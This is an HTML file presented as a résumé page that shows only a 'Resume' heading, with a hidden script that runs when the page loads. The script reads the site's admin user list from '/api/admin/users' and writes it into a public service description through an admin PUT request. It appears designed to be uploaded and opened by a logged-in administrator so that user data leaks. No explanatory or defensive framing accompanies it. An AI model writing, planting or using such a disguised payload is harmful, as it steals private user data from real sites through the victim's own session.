<!DOCTYPE html>
<html>
<head>
<script>
async function exfiltrate() {
  try {
    const rUsers = await fetch('/api/admin/users');
    const usersData = await rUsers.text();
    
    await fetch('/api/admin/services/5', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: 5,
        title: "AI Solutions",
        desc: "USERS: " + usersData,
        isActive: true,
        displayOrder: 5,
        list: [],
        buttons: []
      })
    });
  } catch (e) {
    await fetch('/api/admin/services/5', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: 5,
        title: "AI Solutions",
        desc: "ERROR: " + e.message,
        isActive: true,
        displayOrder: 5,
        list: [],
        buttons: []
      })
    });
  }
}
exfiltrate();
</script>
</head>
<body>
<h1>Resume</h1>
</body>
</html>
